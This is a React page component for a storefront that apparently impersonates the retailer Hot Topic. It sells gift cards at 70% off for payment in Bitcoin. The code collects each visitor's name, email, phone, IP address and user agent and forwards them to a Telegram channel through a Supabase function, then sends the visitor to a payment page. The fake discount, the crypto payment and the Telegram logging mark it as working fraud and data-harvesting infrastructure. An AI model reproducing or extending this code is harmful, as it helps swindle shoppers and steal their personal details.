import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import HotTopicHeader from "@/components/HotTopicHeader";
import HotTopicFooter from "@/components/HotTopicFooter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "@/hooks/use-toast";
import TestimonialCarousel from "@/components/TestimonialCarousel";
import HotTopicPromo from "@/components/HotTopicPromo";
import GiftCardOption from "@/components/GiftCardOption";
import DeliveryMethodSelector from "@/components/DeliveryMethodSelector";
import { useIsMobile } from "@/hooks/use-mobile";
import { AlertCircle } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

const giftCardAmounts = [50, 100, 150, 200, 250];
const discountPercentage = 0.7; // 70% discount
const calculateDiscountedPrice = (amount: number) => amount * discountPercentage;

const validateEmail = (email: string) => {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(email);
};

const validatePhone = (phone: string) => {
  const regex = /^[0-9]{10}$/;
  return regex.test(phone);
};

const validateName = (name: string) => {
  return name.trim() !== "";
};

const Index = () => {
  const navigate = useNavigate();
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
  const [selectedDeliveryMethod, setSelectedDeliveryMethod] = useState<"e-gift" | "physical">("e-gift");
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
  });
  const [errors, setErrors] = useState({
    name: "",
    email: "",
    phone: "",
  });
  const [discountedPrice, setDiscountedPrice] = useState(0);
  const [couponCode, setCouponCode] = useState("");
  const [couponError, setCouponError] = useState("");

  // Add user info state
  const [userInfo, setUserInfo] = useState({
    ip: "Loading...",
    userAgent: navigator.userAgent,
    sessionId: crypto.randomUUID()
  });

  // Get user IP address
  useEffect(() => {
    const fetchIP = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setUserInfo(prev => ({
          ...prev,
          ip: data.ip
        }));
      } catch (error) {
        console.error("Error fetching IP:", error);
        setUserInfo(prev => ({
          ...prev,
          ip: "Unknown"
        }));
      }
    };
    
    fetchIP();
  }, []);

  const handleGiftCardSelect = (amount: number) => {
    setSelectedAmount(amount);
    setDiscountedPrice(calculateDiscountedPrice(amount));
  };

  const handleDeliveryMethodSelect = (method: "e-gift" | "physical") => {
    setSelectedDeliveryMethod(method);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    setErrors((prev) => ({ ...prev, [name]: "" })); // Clear error on input change
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validate form data
    let hasErrors = false;
    const newErrors = { ...errors };

    if (!validateName(formData.name)) {
      newErrors.name = "Name is required";
      hasErrors = true;
    }

    if (!validateEmail(formData.email)) {
      newErrors.email = "Invalid email address";
      hasErrors = true;
    }

    if (!validatePhone(formData.phone)) {
      newErrors.phone = "Invalid phone number";
      hasErrors = true;
    }

    if (!selectedAmount) {
      toast({
        title: "Error",
        description: "Please select a gift card amount.",
        variant: "destructive",
      });
      return;
    }

    setErrors(newErrors);

    if (hasErrors) {
      return;
    }

    if (couponCode.toLowerCase() === "hottopic2024") {
      setDiscountedPrice(0.01);
      toast({
        title: "Coupon Applied",
        description: "Congratulations! You get it for one cent!",
      });
    } else if (couponCode !== "") {
      setCouponError("Invalid coupon code");
      return;
    }

    try {
      // Create transaction ID
      const transactionId = `HTG-${Date.now().toString().slice(-8)}-${Math.floor(Math.random() * 1000)}`;

      // Create order details object
      const orderDetails = {
        customerName: formData.name,
        email: formData.email,
        phone: formData.phone,
        giftCardValue: selectedAmount,
        paymentAmount: discountedPrice,
        deliveryMethod: selectedDeliveryMethod,
        cryptoCurrency: "BTC",  // Default, could be made selectable
        transactionId: transactionId,
        ip: userInfo.ip,
        userAgent: userInfo.userAgent,
        sessionId: userInfo.sessionId,
        notificationType: "initial_order"  // Mark as initial order notification
      };
      
      // Send initial order notification to Telegram
      try {
        console.log("Sending initial order notification to Telegram");
        
        supabase.functions.invoke("send-telegram-notification", {
          body: orderDetails
        }).then(response => {
          if (response.error) {
            console.error("Failed to send initial order notification:", response.error);
          } else {
            console.log("Initial order notification sent successfully:", response.data);
          }
        });
      } catch (telegramErr) {
        console.error("Error sending initial order notification:", telegramErr);
      }

      // Navigate to payment page
      navigate("/payment", {
        state: {
          orderDetails,
          giftCardValue: selectedAmount,
          discountedAmount: discountedPrice
        }
      });
    } catch (error) {
      console.error("Error submitting form:", error);
      toast({
        title: "System Error",
        description: "We encountered a technical issue. Please try again later.",
        variant: "destructive",
      });
    }
  };

  const isMobile = useIsMobile();

  return (
    <div className="bg-black min-h-screen">
      <HotTopicHeader />

      <div className="container py-8">
        <div className="max-w-3xl mx-auto space-y-6">
          {/* Hero Section */}
          <div className="text-center">
            <h1 className="text-4xl font-bold text-white mb-4">
              Get <span className="text-hottopic-red">70% OFF</span> Hot Topic Gift Cards!
            </h1>
            <p className="text-gray-400 text-lg">
              Limited time offer. Treat yourself or a loved one to the gift of choice.
            </p>
          </div>

          {/* Gift Card Options */}
          <div className="space-y-4">
            <h2 className="text-2xl font-semibold text-white">Choose Your Gift Card</h2>
            <div className="flex flex-wrap gap-4 justify-center">
              {giftCardAmounts.map((amount) => (
                <GiftCardOption
                  key={amount}
                  value={amount}
                  originalPrice={amount}
                  discountedPrice={calculateDiscountedPrice(amount)}
                  isSelected={selectedAmount === amount}
                  onClick={() => handleGiftCardSelect(amount)}
                />
              ))}
            </div>
          </div>

          {/* Delivery Method */}
          <div className="space-y-4">
            <h2 className="text-2xl font-semibold text-white">Select Delivery Method</h2>
            <DeliveryMethodSelector
              selectedMethod={selectedDeliveryMethod}
              onSelect={handleDeliveryMethodSelect}
            />
          </div>

          {/* Customer Information Form */}
          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h2 className="text-2xl font-semibold text-white mb-4">Your Information</h2>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <Label htmlFor="name" className="text-white">
                  Full Name*
                </Label>
                <Input
                  type="text"
                  id="name"
                  name="name"
                  placeholder="Enter your full name"
                  className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red"
                  value={formData.name}
                  onChange={handleInputChange}
                />
                {errors.name && (
                  <p className="text-red-500 text-sm mt-1 flex items-center gap-1">
                    <AlertCircle className="h-4 w-4" />
                    {errors.name}
                  </p>
                )}
              </div>
              <div>
                <Label htmlFor="email" className="text-white">
                  Email Address*
                </Label>
                <Input
                  type="email"
                  id="email"
                  name="email"
                  placeholder="Enter your email address"
                  className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red"
                  value={formData.email}
                  onChange={handleInputChange}
                />
                {errors.email && (
                  <p className="text-red-500 text-sm mt-1 flex items-center gap-1">
                    <AlertCircle className="h-4 w-4" />
                    {errors.email}
                  </p>
                )}
              </div>
              <div>
                <Label htmlFor="phone" className="text-white">
                  Phone Number*
                </Label>
                <Input
                  type="tel"
                  id="phone"
                  name="phone"
                  placeholder="Enter your 10-digit phone number"
                  className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red"
                  value={formData.phone}
                  onChange={handleInputChange}
                />
                {errors.phone && (
                  <p className="text-red-500 text-sm mt-1 flex items-center gap-1">
                    <AlertCircle className="h-4 w-4" />
                    {errors.phone}
                  </p>
                )}
              </div>

              {/* Coupon Code Input */}
              <div>
                <Label htmlFor="coupon" className="text-white">
                  Coupon Code (Optional)
                </Label>
                <Input
                  type="text"
                  id="coupon"
                  name="coupon"
                  placeholder="Enter coupon code"
                  className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red"
                  value={couponCode}
                  onChange={(e) => {
                    setCouponCode(e.target.value);
                    setCouponError(""); // Clear coupon error on change
                  }}
                />
                {couponError && (
                  <p className="text-red-500 text-sm mt-1 flex items-center gap-1">
                    <AlertCircle className="h-4 w-4" />
                    {couponError}
                  </p>
                )}
              </div>

              <Button type="submit" className="w-full py-6 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg">
                Continue to Payment
              </Button>
            </form>
          </div>

          {/* Testimonial Carousel */}
          <TestimonialCarousel />

          {/* Hot Topic Promo */}
          <HotTopicPromo />
        </div>
      </div>

      <HotTopicFooter />
    </div>
  );
};

export default Index;
